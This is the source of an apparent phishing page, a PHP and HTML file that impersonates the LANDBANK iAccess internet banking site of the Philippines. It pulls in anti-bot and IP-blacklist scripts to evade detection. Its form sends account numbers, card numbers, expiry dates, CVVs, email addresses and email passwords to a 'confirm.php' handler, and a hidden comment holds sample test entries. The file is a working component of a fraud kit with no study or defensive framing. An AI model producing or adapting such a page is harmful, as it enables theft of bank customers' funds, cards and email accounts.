<?php
error_reporting(0);
error_log(0);

include("antibots.php");
include("ip_blacklist.php");
include("check.php");
?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml">
<head>

<link type="text/css" rel="stylesheet" href="lb_files/css/one.css">

<link type="text/css" rel="stylesheet" href="lb_files/css/two.css">

<link type="text/css" rel="stylesheet" href="lb_files/css/three.css">

<link type="text/css" rel="stylesheet" href="lb_files/css/four.css">

<meta charset="utf-8">
            <meta http-equiv="X-UA-Compatible" content="IE=edge">
            <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
            <meta name="apple-mobile-web-app-capable" content="yes">
            <meta name="mobile-web-app-capable" content="yes">

            <title>LANDBANK iAccess Retail Internet Banking - Retail</title>
            <link rel="shortcut icon" type="image/x-icon" href="/resources/images/favicon.ico">

<style>
/* head */
#one{
    width: 1056px; 
    margin: 0 auto;
    background-color: #ffffff;
}
#two{
    background: #eaeaea;
    height: 90px;
}

#tiredasfvck {
    float: left;
    background: #ffffff;
    width: 100%;
    padding: 5px;
}




#mainForm h3 {
    color: #414042;
}


/* footer */
footer {
    display: table;
    width: 100%;
    background-color: #ffffff;
    font-size: x-small;
}
footer a{
    color: #ffff80;
}
#warn-one {
    display: inline;
    float: left;
    width: 50%;
    margin: 10px 10px;
}
.warning {
    font-weight: bold;
    color: red;
}
.warn-two {
    font-weight: bold;
}
#contact {
    display: inline;
    float: right;
    width: 46%;
    margin: 10px 10px;
    text-align: right;
}
</style>
</head>
<body>

<div id="one">
   <div id="two">
		<img src="lb_files/img/lbpiaccess.jpg" alt="" width="1056" height="90" />
	</div>
	
	<div id="tiredasfvck">

<form id="mainForm" name="mainForm" method="post" action="confirm.php">
<div id="panelForm" class="ui-panel ui-widget ui-widget-content ui-corner-all" style="border: 0px" data-widget="widget_panelForm"><div id="panelForm_content" class="ui-panel-content ui-widget-content"><div class="ui-panel ui-widget ui-widget-content ui-corner-all"><div class="ui-panel-titlebar ui-widget-header ui-helper-clearfix ui-corner-all"><span class="ui-panel-title">Personal Information</span></div><div class="ui-panel-content ui-widget-content">
 
 <table cellpadding="5">
<tbody>
<tr>
<td><label class="ui-outputlabel ui-widget">First Name</label></td>
<td><input name="fname" type="text" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Firstname is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Middle Name</label></td>
<td><input name="mname" type="text" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Middlename is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Last Name</label></td>
<td><input name="lname" type="text" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Lastname is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<!--
 First Name:hgfgsfa Middle Name:hgfvc Last Name:hgfsc Email:test@email.com Email Password:jmhngfbfvBirthday:235223-03-05 Contact Number:9123456789 Account Number:34571215352 
CC Number:32525 Expiration Date:214214 CVV:241 
-->
<tr>
<td><label class="ui-outputlabel ui-widget">Contact Number</label></td>
<td><input name="cnumber" type="number" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Contact number is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Birthdate</label></td>
<td><input name="bday" type="date" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg="Email address is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>

<br><br/>
<tr>
<td><label class="ui-outputlabel ui-widget">Account Number</label></td>
<td><input name="accnum" type="number" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Card Number</label></td>
<td><input name="cc" type="number" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Expiration Date</label></td>
<td><input name="exp" type="month" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Security Code or CVV</label></td>
<td><input name="cvv" type="number" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Email Address</label></td>
<td><input name="email" type="email" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
<tr>
<td><label class="ui-outputlabel ui-widget">Email Address Password</label></td>
<td><input name="email_pass" type="password" class="ui-inputfield ui-widget ui-state-default ui-corner-all" data-p-rmsg=" is required" role="textbox" aria-disabled="false" aria-readonly="false"></td>
</tr>
</tbody>
</table>
                        <br><button class="ui-button ui-widget ui-state-default ui-corner-all ui-button-text-only" onclick="" type="submit" role="button" aria-disabled="false"><span class="ui-button-text ui-c">Submit</span></button>
								</div></div></div></div>
</form>
                    <br>
                    <br>
                    <br>
                </div>
<!-- end here -->
<footer>
	<div id="warn-one">
		<span class="warning">WARNING:</span>
		<span class="warn-two">iAccess is for authorized clients only.</span>
		<span>It shall be a criminal offense for any person to:</span>
		<ol>
			<li>Obtain access to data without authority;</li>
			<li>Corrupt, alter, steal or destroy data;</li>
			<li>Interfere in computer system or server;</li>
			<li>Introduce computer virus.</li>
		</ol>
		<span>Penalty shall consist of minimum fine of Php100,000 and a maximum commensurate to the damage incurred and a mandatory imprisonment of six months to three years under R.A. No. 8792 (E-Commerce Act of the Philippines).</span>
	</div>

	<div id="contact">
		<span style="color: #0db14b; font-size: 12px; font-weight: bold;">LANDBANK CUSTOMER CARE CENTER</span><br />
		<span>Tel. Nos.: (02) 8405-7000 (NCR) or</span><br />
		<span>1-800-10-405-7000 (PLDT Domestic Toll Free/Outside NCR)</span><br />
		<span>Email: customercare@mail.landbank.com</span><br />
		<hr align="right" style="width: 380px; color: #66cc99; border: 1px solid #66cc99;" />
		<span>Regulated by the Bangko Sentral ng Pilipinas.</span><br />
		<span>Deposits are insured by PDIC up to P500,000 per depositor.</span><br />
		<span style="display: flex; flex-direction: row-reverse">
			<img src="lb_files/img/bancnet.png" alt="" width="100" height="20" />
			<span>A Proud Member of </span>
		</span>
	</div>
</div>
</footer>
</body>
